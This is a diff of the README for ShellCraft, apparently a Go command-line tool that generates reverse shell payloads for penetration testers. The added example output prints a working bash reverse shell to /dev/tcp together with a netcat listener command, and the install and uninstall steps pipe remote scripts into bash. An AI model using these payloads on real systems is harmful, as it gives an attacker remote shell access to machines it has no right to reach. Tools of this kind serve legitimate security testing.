@@ -1,10 +1,15 @@
 # ShellCraft
 
+[![Go Version](https://img.shields.io/github/go-mod/go-version/MKMithun2806/ShellCraft)](https://go.dev/)
+[![License](https://img.shields.io/github/license/MKMithun2806/ShellCraft)](LICENSE)
+[![Latest Release](https://img.shields.io/github/v/release/MKMithun2806/ShellCraft)](https://github.com/MKMithun2806/ShellCraft/releases)
+
 ShellCraft is a standalone, interactive CLI tool written in Go for generating local reverse shell payloads. It is designed for cybersecurity professionals and enthusiasts to quickly generate common and obfuscated payloads using only the Go standard library.
 
 ## Features
 
 - **Interactive Workflow:** Guides you through inputting the attacker IP and port.
+- **Clipboard Support:** Copy generated payloads directly to your clipboard with one click.
 - **Multiple Payloads:**
   - **Linux Bash:** Standard bash reverse shell.
   - **Linux/macOS NC FIFO:** Netcat-based shell using a named pipe.
@@ -31,7 +36,7 @@ curl -sSL https://raw.githubusercontent.com/MKMithun2806/ShellCraft/main/install
 ### Option 2: Using go install
 
 ```bash
-go install github.com/MKMithun2806/ShellCraft@latest
+go install github.com/MKMithun2806/ShellCraft/src@latest
 ```
 
 ### Option 3: Manual Build
@@ -43,23 +48,42 @@ go install github.com/MKMithun2806/ShellCraft@latest
    ```
 2. Build the binary:
    ```bash
-   go build -o shellcraft src/*.go
+   go build -ldflags "-X main.Version=1.0.0" -o shellcraft src/*.go
    ```
 
 ## Usage
 
-Run the generated binary:
+Run the tool:
 ```bash
-./shellcraft
+shellcraft
 ```
 
-Follow the interactive prompts:
-1. Enter your **Attacker IP**.
-2. Enter your **Attacker Port**.
-3. Select the **Payload Type**.
-4. Select the **Encoding/Wrapper**.
+### Example
 
-The tool will then output the `nc` listener command and the finalized payload.
+1. **Input IP:** `10.10.10.10`
+2. **Input Port:** `4444`
+3. **Select Payload:** `Linux Bash`
+4. **Select Wrapper:** `Raw`
+
+**Expected Output:**
+```text
+============================================================
+[+] Listener Command:
+    nc -lvnp 4444
+
+[+] Finalized Payload (Linux Bash - Raw):
+
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+
+============================================================
+```
+
+## Uninstallation
+
+To remove ShellCraft:
+```bash
+curl -sSL https://raw.githubusercontent.com/MKMithun2806/ShellCraft/main/uninstall.sh | bash
+```
 
 ## Disclaimer
 
